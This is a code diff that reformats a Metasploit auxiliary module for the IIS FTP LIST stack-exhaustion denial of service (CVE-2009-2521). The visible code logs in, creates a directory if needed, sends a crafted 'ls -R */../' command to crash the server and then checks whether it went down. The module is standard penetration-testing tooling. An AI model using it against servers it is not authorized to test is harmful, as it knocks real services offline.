@@ -8,41 +8,44 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Dos
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'           => 'Microsoft IIS FTP Server LIST Stack Exhaustion',
-      'Description'    => %q{
+    super(
+      update_info(
+        info,
+        'Name' => 'Microsoft IIS FTP Server LIST Stack Exhaustion',
+        'Description' => %q{
           This module triggers Denial of Service condition in the Microsoft Internet
-        Information Services (IIS) FTP Server 5.0 through 7.0 via a list (ls) -R command
-        containing a wildcard. For this exploit to work in most cases, you need 1) a valid
-        ftp account: either read-only or write-access account 2) the "FTP Publishing" must
-        be configured as "manual" mode in startup type 3) there must be at least one
-        directory under FTP root directory. If your provided an FTP account has write-access
-        privilege and there is no single directory, a new directory with random name will be
-        created prior to sending exploit payload.
-      },
-      'Author'         =>
-        [
+          Information Services (IIS) FTP Server 5.0 through 7.0 via a list (ls) -R command
+          containing a wildcard. For this exploit to work in most cases, you need 1) a valid
+          ftp account: either read-only or write-access account 2) the "FTP Publishing" must
+          be configured as "manual" mode in startup type 3) there must be at least one
+          directory under FTP root directory. If your provided an FTP account has write-access
+          privilege and there is no single directory, a new directory with random name will be
+          created prior to sending exploit payload.
+        },
+        'Author' => [
           'Kingcope', # Initial discovery
-          'Myo Soe'   # Metasploit Module (http://yehg.net)
+          'Myo Soe' # Metasploit Module (http://yehg.net)
         ],
-      'License'        => MSF_LICENSE,
-      'References'     =>
-        [
+        'License' => MSF_LICENSE,
+        'References' => [
           [ 'CVE', '2009-2521'],
           [ 'BID', '36273'],
           [ 'OSVDB', '57753'],
           [ 'MSB', 'MS09-053'],
           [ 'URL', 'http://archives.neohapsis.com/archives/fulldisclosure/2009-09/0040.html']
         ],
-      'DisclosureDate' => '2009-09-03'))
+        'DisclosureDate' => '2009-09-03'
+      )
+    )
   end
 
   def run
     # Attempt to crash IIS FTP
     begin
       return unless connect_login
+
       print_status('Checking if there is at least one directory ...')
-      res = send_cmd_data(['ls'],'')
+      res = send_cmd_data(['ls'], '')
 
       if res.to_s =~ /\<DIR\>          / then
         print_status('Directory found, skipped creating a directory')
@@ -50,7 +53,7 @@ class MetasploitModule < Msf::Auxiliary
         print_status('No single directory found')
         print_status('Attempting to create a directory ...')
         new_dir = Rex::Text.rand_text_alphanumeric(6)
-        res = send_cmd(['mkd',new_dir])
+        res = send_cmd(['mkd', new_dir])
         if res =~ /directory created/ then
           print_status("New directory \"#{new_dir}\" was created!")
         else
@@ -62,7 +65,7 @@ class MetasploitModule < Msf::Auxiliary
       end
 
       print_status("Sending DoS packets ...")
-      res = send_cmd_datax(['ls','-R */../'],' ')
+      res = send_cmd_datax(['ls', '-R */../'], ' ')
       disconnect
     rescue ::Interrupt
       raise $!
@@ -75,7 +78,7 @@ class MetasploitModule < Msf::Auxiliary
     rescue
     end
 
-    #More careful way to check DOS
+    # More careful way to check DOS
     print_status("Checking server's status...")
     begin
       connect_login
@@ -92,17 +95,19 @@ class MetasploitModule < Msf::Auxiliary
     args[0] = "LIST"
     # Set the transfer mode and connect to the remove server
     return nil if not data_connect(mode)
+
     # Our pending command should have got a connection now.
     res = send_cmd(args, true, nsock)
     # make sure could open port
     return nil unless res =~ /^(150|125) /
+
     # dispatch to the proper method
     begin
       data = self.datasocket.get_once(-1, ftp_timeout)
     rescue ::EOFError
       data = nil
     end
-    select(nil,nil,nil,1)
+    select(nil, nil, nil, 1)
     # close data channel so command channel updates
     data_disconnect
     # get status of transfer
